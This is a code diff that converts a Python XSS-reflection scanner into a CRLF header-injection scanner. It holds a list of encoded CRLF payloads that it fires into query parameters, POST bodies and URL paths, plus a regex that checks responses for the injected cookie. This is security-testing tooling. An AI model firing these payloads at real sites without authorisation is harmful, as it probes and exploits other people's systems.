@@ -2,6 +2,7 @@ import json
 import logging
 import asyncio
 import httpx
+import re
 from urllib.parse import urlparse, urljoin, urlencode, parse_qs
 from tabulate import tabulate
 from colorama import init, Fore
@@ -10,38 +11,33 @@ from colorama import init, Fore
 init(autoreset=True)
 
 # Configuration
-XSS_PAYLOADS = [
-    "injectx<injectx",
-    "injectx%3Cinjectx",
-    "injectx%u003cinjectx",
-    "injectx%26lt;injectx",
-    "injectx%26%2360;injectx",
-    "injectx%26%23x3c;injectx",
-    "aW5qZWN0eDxpbmplY3R4",
-    "injectx%253cinjectx"
+CRLF_PAYLOADS = [
+    '%%0a0aSet-Cookie:crlf=injection',
+    '%0aSet-Cookie:crlf=injection',
+    '%0d%0aSet-Cookie:crlf=injection',
+    '%0dSet-Cookie:crlf=injection',
+    '%23%0aSet-Cookie:crlf=injection',
+    '%23%0d%0aSet-Cookie:crlf=injection',
+    '%23%0dSet-Cookie:crlf=injection',
+    '%25%30%61Set-Cookie:crlf=injection',
+    '%25%30aSet-Cookie:crlf=injection',
+    '%250aSet-Cookie:crlf=injection',
+    '%25250aSet-Cookie:crlf=injection',
+    '%2e%2e%2f%0d%0aSet-Cookie:crlf=injection',
+    '%2f%2e%2e%0d%0aSet-Cookie:crlf=injection',
+    '%2F..%0d%0aSet-Cookie:crlf=injection',
+    '%3f%0d%0aSet-Cookie:crlf=injection',
+    '%3f%0dSet-Cookie:crlf=injection',
+    '%u000aSet-Cookie:crlf=injection'
 ]
-XSS_CONTENT_TYPES = [
-    "text/html",
-    "application/xhtml+xml",
-    "application/xml",
-    "text/xml",
-    "image/svg+xml",
-    "text/xsl",
-    "application/vnd.wap.xhtml+xml",
-    "text/rdf",
-    "application/rdf+xml",
-    "application/mathml+xml",
-    "text/vtt",
-    "text/cache-manifest"
-]
-DEFAULT_TIMEOUT = 50
+DEFAULT_TIMEOUT = 10
 
 # Concurrency limit for async tasks
 SEMAPHORE_LIMIT = 5  # You can adjust this value based on your system's capacity
 
-async def inject_xss_payload(session, request, semaphore):
+async def inject_CRLF_payload(session, request, semaphore):
     """
-    Inject XSS payloads into the request and test for vulnerabilities, including path-based XSS.
+    Inject CRLF payloads into the request and test for vulnerabilities, including path-based CRLF.
     
     Args:
         session: The HTTPX session.
@@ -54,7 +50,7 @@ async def inject_xss_payload(session, request, semaphore):
     results = []
     url = request["url"]
     method = request.get("method", "GET").upper()
-    headers = request.get("headers", {}).copy()  # Copy headers to modify safely
+    headers = request.get("headers", {}).copy()
     body = request.get("body")
     parsed_url = urlparse(url)
     query_params = parse_qs(parsed_url.query)
@@ -64,7 +60,7 @@ async def inject_xss_payload(session, request, semaphore):
         # Test GET requests with query parameters
         if method == "GET" and query_params:
             for param, values in query_params.items():
-                for payload in XSS_PAYLOADS:
+                for payload in CRLF_PAYLOADS:
                     modified_params = query_params.copy()
                     modified_params[param] = [payload for value in values]
                     new_query_string = "&".join(
@@ -72,45 +68,28 @@ async def inject_xss_payload(session, request, semaphore):
                     )
                     new_url = urljoin(url, f"{parsed_url.path}?{new_query_string}")
 
-                    result = await test_xss(session, new_url, method, headers=headers)
-                    if result and result["xss_detected"]:
-                        # **Capture query parameters in the result**
+                    result = await test_CRLF(session, new_url, method, headers=headers)
+                    if result and result["CRLF_detected"]:
                         result["query_params"] = query_params  # Original query parameters
                         result["modified_query_params"] = modified_params  # Modified query parameters
                         result["payload"] = payload  # The payload used
                         results.append(result)
-                        break  # Stop testing further payloads for this parameter
+                        break  # Break after detecting CRLF and move to the next request
 
         # Test POST requests with payloads
         elif method == "POST" and body:
-            for payload in XSS_PAYLOADS:
+            for payload in CRLF_PAYLOADS:
                 if isinstance(body, str):
-                    # Replace payload in string bodies
                     modified_body = body + payload
                     logging.debug(f"Modified body size (str): {len(modified_body)}")
-                    
-                    # Check if the body exceeds a reasonable size
-                    if len(modified_body) > 2000:  # Adjust the limit as needed
-                        logging.debug(f"Skipping payload, body size too large: {len(modified_body)}")
-                        continue
-                    
-                    # Remove Content-Length to let HTTPX calculate it automatically
                     headers.pop("Content-Length", None)
                     headers["Transfer-Encoding"] = "chunked"  # Add chunked encoding
                 elif isinstance(body, dict):
-                    # Add payload to dictionary bodies
-                    modified_body = {key: value + payload for key, value in body.items()}
+                    modified_body = {key: payload for key, value in body.items()}
                     body_str = json.dumps(modified_body)
                     logging.debug(f"Modified body size (dict): {len(body_str)}")
-                    
-                    # Check if the body exceeds a reasonable size
-                    if len(body_str) > 2000:  # Adjust the limit as needed
-                        logging.debug(f"Skipping payload, body size too large: {len(body_str)}")
-                        continue
-                    
-                    # Remove Content-Length to let HTTPX calculate it automatically
                     headers.pop("Content-Length", None)
-                    headers["Transfer-Encoding"] = "chunked"  # Add chunked encoding
+                    headers["Transfer-Encoding"] = "chunked"
                 else:
                     modified_body = body
 
@@ -119,51 +98,47 @@ async def inject_xss_payload(session, request, semaphore):
 
                 # Send the request with the modified body
                 try:
-                    result = await test_xss(session, url, method, headers=headers, data=modified_body)
-                    if result and result["xss_detected"]:
-                        # **Capture POST data in the result**
+                    result = await test_CRLF(session, url, method, headers=headers, data=modified_body)
+                    if result and result["CRLF_detected"]:
                         result["post_data"] = body  # Original POST data
                         result["modified_post_data"] = modified_body  # Modified POST data with payload
                         result["payload"] = payload  # The payload used
                         results.append(result)
-                        break  # Stop testing further payloads
+                        break  # Break after detecting CRLF and move to the next request
                 except Exception as e:
-                    logging.error(f"Error while testing XSS payload: {e}")
+                    logging.error(f"Error while testing CRLF payload: {e}")
                     continue
 
-        # Path-Based XSS Detection (only modify path)
+        # Path-Based CRLF Detection (only modify path)
         if method == "GET":
-            # Modify path parameters with XSS payloads (Do NOT modify query or body here)
             path_parts = parsed_url.path.split('/')
 
             # Look for path segments that could be vulnerable
             for i, part in enumerate(path_parts):
                 if part:  # Only modify non-empty path segments
-                    for payload in XSS_PAYLOADS:
-                        path_parts[i] = part + payload
+                    for payload in CRLF_PAYLOADS:
+                        path_parts[i] = payload
                         modified_path = '/'.join(path_parts[:i] + [payload])
                         new_url = urlparse(url)._replace(path=modified_path).geturl()
 
                         # Send the request with the modified path
                         try:
-                            result = await test_xss(session, new_url, method, headers=headers)
-                            if result and result["xss_detected"]:
-                                # **Capture path-based XSS in the result**
+                            result = await test_CRLF(session, new_url, method, headers=headers)
+                            if result and result["CRLF_detected"]:
                                 result["path"] = parsed_url.path  # Original path
                                 result["modified_path"] = modified_path  # Modified path with payload
                                 result["payload"] = payload  # The payload used
                                 results.append(result)
-                                break  # Stop testing further payloads for this path segment
+                                break  # Break after detecting CRLF and move to the next request
                         except Exception as e:
-                            logging.error(f"Error while testing path-based XSS payload: {e}")
+                            logging.error(f"Error while testing path-based CRLF payload: {e}")
                         path_parts[i] = part  # Reset path segment after testing
 
     return results
 
-
-async def test_xss(session, url, method, headers=None, data=None):
+async def test_CRLF(session, url, method, headers=None, data=None):
     """
-    Send an HTTP request and test for XSS vulnerabilities.
+    Send an HTTP request and test for CRLF vulnerabilities.
     
     Args:
         session: The HTTPX session.
@@ -173,29 +148,29 @@ async def test_xss(session, url, method, headers=None, data=None):
         data: Optional data for POST requests.
     
     Returns:
-        A dictionary with the test results or None if no reflection is detected.
+        A dictionary with the test results or None if no CRLF is detected.
     """
     try:
         response = await session.request(method, url, headers=headers, data=data, timeout=DEFAULT_TIMEOUT)
-        content_type = response.headers.get("Content-Type", "")
 
-        if any(ct in content_type for ct in XSS_CONTENT_TYPES):
-            for payload in XSS_PAYLOADS:
-                if "injectx<injectx" in response.text:
+        for payload in CRLF_PAYLOADS:
+            if "Set-Cookie" in response.headers:
+                set_cookie_header = response.headers["Set-Cookie"]
+                set_cookie_pattern = r'(?m)^(?:Set-Cookie\s*?:(?:\s*?|.*?;\s*?))(crlf=injection)(?:\s*?)(?:$|;)'
+                if re.search(set_cookie_pattern, set_cookie_header):
                     return {
                         "url": url,
                         "method": method,
                         "status_code": response.status_code,
-                        "content_type": content_type,
-                        "xss_detected": True,
-                        "payload": payload
+                        "CRLF_detected": True,
+                        "payload": set_cookie_header,
+                        "detected_in": "header"
                     }
         return {
             "url": url,
             "method": method,
             "status_code": response.status_code,
-            "content_type": content_type,
-            "xss_detected": False
+            "CRLF_detected": False
         }
     except httpx.RequestError as e:
         logging.error(f"Error testing {url} with payload: {data}. Exception: {e}")
@@ -203,8 +178,7 @@ async def test_xss(session, url, method, headers=None, data=None):
             "url": url,
             "method": method,
             "status_code": "Error",
-            "content_type": "N/A",
-            "xss_detected": False,
+            "CRLF_detected": False,
             "error": str(e)
         }
     except Exception as e:
@@ -213,24 +187,23 @@ async def test_xss(session, url, method, headers=None, data=None):
             "url": url,
             "method": method,
             "status_code": "Error",
-            "content_type": "N/A",
-            "xss_detected": False,
+            "CRLF_detected": False,
             "error": str(e)
         }
 
 async def process_requests(requests):
     """
-    Process all requests from requests.json and check for XSS vulnerabilities.
+    Process all requests from requests.json and check for CRLF vulnerabilities.
     
     Args:
         requests: A list of request dictionaries.
     
     Returns:
-        A list of results from the XSS tests.
+        A list of results from the CRLF tests.
     """
     semaphore = asyncio.Semaphore(SEMAPHORE_LIMIT)  # Limit concurrent tasks
     async with httpx.AsyncClient() as session:
-        tasks = [inject_xss_payload(session, request, semaphore) for request in requests]
+        tasks = [inject_CRLF_payload(session, request, semaphore) for request in requests]
         results = await asyncio.gather(*tasks)
         return [item for sublist in results for item in sublist]  # Flatten the results
 
@@ -252,12 +225,12 @@ def save_results(results, output_file):
     Save results to a JSON file.
     
     Args:
-        results: List of results from the XSS tests.
+        results: List of results from the CRLF tests.
         output_file: Path to the output file.
     """
     with open(output_file, 'w') as f:
         json.dump(results, f, indent=4)
-        
+
 def save_output_on_exit(sig, frame):
     """Function to save output gracefully when interrupted."""
     logging.info("Saving output before exit...")
@@ -271,30 +244,29 @@ def print_results(results):
     Print results in a formatted table.
     
     Args:
-        results: List of results from the XSS tests.
+        results: List of results from the CRLF tests.
     """
-    # Filter results to only show detected XSS vulnerabilities
-    xss_results = [result for result in results if result["xss_detected"]]
+    # Filter results to only show detected CRLF vulnerabilities
+    CRLF_results = [result for result in results if result["CRLF_detected"]]
 
-    if not xss_results:
-        print(Fore.YELLOW + "No XSS vulnerabilities detected.")
+    if not CRLF_results:
+        print(Fore.YELLOW + "No CRLF vulnerabilities detected.")
         return
 
     table_data = []
-    for result in xss_results:
+    for result in CRLF_results:
         table_data.append([
             result["url"],
             result["method"],
             result["status_code"],
-            result["content_type"],
-            Fore.RED + "XSS Detected"
+            Fore.RED + "CRLF Detected"
         ])
-    headers = ["URL", "Method", "Status Code", "Content Type", "XSS Detection"]
+    headers = ["URL", "Method", "Status Code", "CRLF Detection"]
     print(tabulate(table_data, headers, tablefmt="grid", stralign="center"))
 
 async def main(input_file, output_file):
     """
-    Main function to orchestrate the XSS detection process.
+    Main function to orchestrate the CRLF detection process.
     
     Args:
         input_file: Path to the input JSON file.
@@ -304,11 +276,11 @@ async def main(input_file, output_file):
     logging.info(f"Loaded {len(requests)} requests for testing.")
 
     results = await process_requests(requests)
-    # Filter results to only include XSS detections
-    xss_results = [result for result in results if result["xss_detected"]]
+    # Filter results to only include CRLF detections
+    CRLF_results = [result for result in results if result["CRLF_detected"]]
 
-    print_results(xss_results)
-    save_results(xss_results, output_file)
+    print_results(CRLF_results)
+    save_results(CRLF_results, output_file)
     signal.signal(signal.SIGINT, save_output_on_exit)
 
 if __name__ == "__main__":
@@ -317,19 +289,12 @@ if __name__ == "__main__":
     import signal
 
     # Define a signal handler to save results on interrupt
-    def save_output_on_exit(signal_num, frame):
-        print("\nGracefully exiting and saving results...")
-        with open("output.json", "w") as f:
-            json.dump(requests_data, f, indent=4)
-        sys.exit(0)
-
-    # Add the signal handler for `Ctrl+C`
     signal.signal(signal.SIGINT, save_output_on_exit)
 
     # Command-line argument parsing
-    parser = argparse.ArgumentParser(description="XSS Detection Tool")
+    parser = argparse.ArgumentParser(description="CRLF Detection Tool")
     parser.add_argument("--input", default="requests.json", help="Input file with requests (default: requests.json)")
-    parser.add_argument("--output", default="results-xss.json", help="Output file for results (default: results-xss.json)")
+    parser.add_argument("--output", default="results_CRLF.json", help="Output file for results (default: results_CRLF.json)")
     parser.add_argument("--verbose", action="store_true", help="Enable verbose logging")
     args = parser.parse_args()
 
@@ -344,3 +309,4 @@ if __name__ == "__main__":
         asyncio.run(main(args.input, args.output))
     except KeyboardInterrupt:
         print("\nExecution interrupted by user.")
+
